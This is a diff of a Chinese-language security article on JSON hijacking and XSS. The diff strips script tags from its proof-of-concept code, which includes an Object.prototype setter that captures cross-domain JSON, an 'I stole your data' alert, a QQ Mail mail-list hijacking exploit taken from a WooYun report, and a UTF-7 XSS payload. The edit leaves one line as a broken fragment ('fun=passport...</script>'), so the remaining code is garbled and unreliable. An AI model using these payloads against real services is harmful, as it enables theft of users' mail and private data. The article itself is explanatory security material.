@@ -214,7 +214,6 @@ Object.prototype.__defineSetter__('Id', function(obj){alert(obj);});
 **</span>
 ``` 
 
-<script type="text/javascript">
 
 var secrets;
 
@@ -224,13 +223,6 @@ secrets = this;
 
 };
 
-</script>
-
-<script src="http://haacked.com/demos/secret-info.json"
-
-type="text/javascript"></script>
-
-<script type="text/javascript">
 
 var yourData = '';
 
@@ -244,23 +236,15 @@ yourData += secrets[i] + ' ';
 
 alert('I stole your data: ' + yourData);
 
-</script>
-
 ``` 
 
 <span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">下面举一个实际的例子，通过构造URL让用户访问，可以获得QQ Mail的邮件列表。该漏洞由于需要在web QQ里共享QQ Mail里的邮件信息，所以QQ Mail开放了一个json接口以提供第三方的域名来获得QQ Mail的信息，但是由于该接口缺乏足够的认证，所以导致任何第三方域里都可以用script的方式来获取该邮件列表。[WooYun: QQMail邮件泄露漏洞](http://www.wooyun.org/bugs/wooyun-2010-046) 详见地址http://www.wooyun.org/bugs/wooyun-2010-046
 </span>
 ``` 
 
-<script>
-
 var Qmail={};
 
-</script>
-
-<script src="http://mail.qq.com/cgi-bin/login?fun=passport&amp;target=MLIST&amp;t=login.js&amp;pagesize=10&amp;resp_charset=gb2312&amp;1=3"></script>
-
-<script>
+fun=passport&amp;target=MLIST&amp;t=login.js&amp;pagesize=10&amp;resp_charset=gb2312&amp;1=3"></script>
 
 alert(Qmail.newMailsList.nextUrl);
 
@@ -268,7 +252,7 @@ alert(document.scripts[1].src=Qmail.newMailsList.nextUrl);
 
 alert(Qmail.newMailsList.summary);
 
-</script>
+
 ``` 
 
 ## 4.漏洞防御:
@@ -295,7 +279,7 @@ alert(Qmail.newMailsList.summary);
 <span style="color: #17365d; font-family: 仿宋; font-size: 14pt;">其中 +/v8  为 utf7-BOM ，后面的为我们注入的 utf-7 编码后的 XSS 代码的：
 ``` 
 
-<script>alert(1);</script>
+alert(1);
 
 ``` 
 
